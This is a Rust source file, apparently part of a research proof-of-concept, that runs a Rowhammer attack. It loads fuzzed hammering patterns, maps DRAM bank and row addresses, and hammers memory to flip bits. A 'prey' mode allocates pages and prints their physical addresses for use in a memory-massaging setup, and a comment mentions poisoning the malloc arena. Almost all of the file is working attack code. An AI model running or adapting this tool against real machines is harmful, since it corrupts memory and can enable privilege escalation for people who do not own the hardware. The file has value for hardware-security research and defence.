use std::{
    env,
    fs::File,
    io::{stdin, BufReader},
    process::Command,
    ptr::null_mut,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
    thread,
};

use anyhow::{bail, Context};
use bs_poc::{
    forge::{FuzzSummary, Hammerer, Hammering, HammeringPattern, PatternAddressMapper},
    jitter::AggressorPtr,
    memory::{BlockMemory, DRAMAddr, LinuxPageMap, VirtToPhysResolver},
    util::{retry, BlacksmithConfig, MemConfiguration, KNOWN_BITS, PAGE_SIZE},
    victim::{HammerVictim, HammerVictimMemCheck},
};
use clap::Parser;
use libc::{MAP_ANONYMOUS, MAP_PRIVATE, PROT_READ, PROT_WRITE};
use log::{debug, info};

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The bait-alloc mode.
    #[clap(long = "mode", default_value = "bait")]
    mode: BaitMode,
    ///The BlacksmithConfig
    #[clap(long = "config")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(long = "pattern")]
    pattern: Option<String>,
    /// The mapping ID to load from the JSON file (optional, will determine most optimal pattern if omitted)
    #[clap(long = "mapping")]
    mapping: Option<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum BaitMode {
    Bait,
    Prey,
}

const PREY_PAGE_COUNT: usize = 500;

fn _prog() -> Option<String> {
    env::args().next().as_ref().cloned()
}

/// Send a signal `sig` to the process `pid`
fn _signal(sig: &str, pid: u32) -> anyhow::Result<()> {
    let mut kill = Command::new("kill")
        .args(["-s", sig, &pid.to_string()])
        .spawn()?;
    kill.wait()?;
    Ok(())
}

fn find_mapping_base(
    mapping: PatternAddressMapper,
    mem_config: MemConfiguration,
    base_msb: *const u8,
) -> *const u8 {
    let addr = DRAMAddr::new(mapping.bank_no, mapping.min_row, 0);
    addr.to_virt(base_msb, mem_config)
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            println!(
                "{}: {} (max flips: {:?})",
                i,
                pattern.id,
                pattern
                    .address_mappings
                    .iter()
                    .map(|m| &m.bit_flips)
                    .flatten()
                    .count(),
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(&option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

unsafe fn mode_bait(args: CliArgs) -> anyhow::Result<()> {
    let config = BlacksmithConfig::from_jsonfile(&args.config).with_context(|| "from_jsonfile")?;
    let mem_config =
        MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);

    const BASE_MSB: *const u8 = 0x2000000000 as *const u8;

    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(&mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    debug!("{:?}", mapping);

    // find offset from base and mapping start
    let mapping_base = find_mapping_base(mapping.clone(), mem_config, BASE_MSB as *const u8);
    let mapping_end = DRAMAddr::new(mapping.bank_no, mapping.max_row, 0)
        .to_virt(BASE_MSB as *const u8, mem_config);
    let num_rows = mapping_end as usize - mapping_base as usize + 1;
    let flips = &mapping.bit_flips;
    for flips in flips {
        for flip in flips {
            info!(
                "flip {:?}: {}",
                flip,
                flip.dram_addr.to_virt(BASE_MSB as *const u8, mem_config) as usize >> 20
            );
        }
    }
    info!("flips: {:?}", flips);
    //let flip_aggr_offset = find_flip_aggr_offset(mapping.clone(), mem_config)?;
    info!("base_msb: {:?}", BASE_MSB as *const u8);
    info!("determined mapping base as {:?}", mapping_base);
    info!("mapping length: {}", num_rows);
    //info!("determined flip aggr offset as {}", flip_aggr_offset);

    for (aggr, addr) in &mapping.aggressor_to_addr {
        debug!(
            "{:?}: {:?}, {:?}",
            aggr,
            addr,
            addr.to_virt(BASE_MSB as AggressorPtr, mem_config)
        );
    }

    let mapping_min = DRAMAddr::new(mapping.bank_no, mapping.min_row, 0);
    let mapping_max = DRAMAddr::new(mapping.bank_no, mapping.max_row, 0);
    info!(
        "mapping range: [{:?}, {:?}], [{:?}, {:?}]",
        mapping_min,
        mapping_max,
        mapping_min.to_virt(BASE_MSB, mem_config),
        mapping_max.to_virt(BASE_MSB, mem_config)
    );

    //log_pagetypeinfo();
    //let prog = prog().expect("prog");
    //let child = Command::new(prog)
    //    .stdout(Stdio::piped())
    //    .args(["--mode", "prey"])
    //    .spawn()?;
    //let mut set_iter = sets.iter();
    //let mut cur = set_iter.next();
    //while let Some((base, _)) = cur {

    // get mapping size, round to nearest multiple of PAGE_SIZE
    let num_sets = mapping.aggressor_sets(mem_config, KNOWN_BITS).len();
    let memory = BlockMemory::new(num_sets * (1usize << KNOWN_BITS))?;
    let hammering_addrs = mapping.get_hammering_addresses_relocate(
        &pattern.access_ids,
        mem_config,
        KNOWN_BITS,
        &memory.blocks,
    )?;

    let hammerer = Hammerer::new(
        mem_config,
        pattern.clone(),
        mapping.clone(),
        &hammering_addrs,
        &memory.blocks,
    )?;
    // let hammerer = DummyHammerer::new(memory.addr(0), 0x42);
    let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);

    info!("Hammering pattern. This will take a while...");
    let res = hammerer.hammer(&mut victim);
    print!("{:?}", res);
    victim.log_report(BASE_MSB as AggressorPtr);

    // signal child process
    //signal("INT", child.id())?;
    //let _output = child.wait_with_output().expect("child wait");
    //thread::sleep(std::time::Duration::from_secs(2));

    // cleanup
    //libc::munmap(v as *mut c_void, 2 * MB);
    // TODO munmap all allocation
    return Ok(());
}

// TODO entweder malloc arena vergiften oder viel speicher alloziieren und wenig freigeben
unsafe fn mode_prey(mut resolver: LinuxPageMap) -> anyhow::Result<()> {
    // setup signal handler
    let waiting = Arc::new(AtomicBool::new(true));
    let waiting_sigh = waiting.clone();
    ctrlc::set_handler(move || {
        waiting_sigh.store(false, Ordering::SeqCst);
    })
    .expect("ctrlc setup failed");

    // wait for signal
    while waiting.load(Ordering::SeqCst) {
        thread::sleep(std::time::Duration::from_millis(1));
    }

    // allocate 500 4K pages
    let mut virt = [std::ptr::null_mut(); PREY_PAGE_COUNT];
    let mut phys = [0_u64; PREY_PAGE_COUNT];

    // allocate pages
    for i in 0..PREY_PAGE_COUNT {
        let v = libc::mmap(
            null_mut(),
            PAGE_SIZE,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0,
        );
        //let v = libc::malloc(PAGE_LEN);
        libc::memset(v, 0_i32, PAGE_SIZE);
        let p = resolver
            .get_phys(v as u64)
            .context("virt_to_phys failed. Are we root?")?;
        phys[i] = p;
        virt[i] = v;
    }

    // log phys addrs to stdout
    for i in 0..PREY_PAGE_COUNT {
        println!("{}", phys[i]);
    }

    for i in 0..PREY_PAGE_COUNT {
        libc::munmap(virt[i], PAGE_SIZE);
    }

    Ok(())
}

unsafe fn _main() -> anyhow::Result<()> {
    env_logger::init();
    let args = CliArgs::parse();

    let resolver = LinuxPageMap::new()?;

    match args.mode {
        BaitMode::Bait => mode_bait(args),
        BaitMode::Prey => mode_prey(resolver),
    }
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
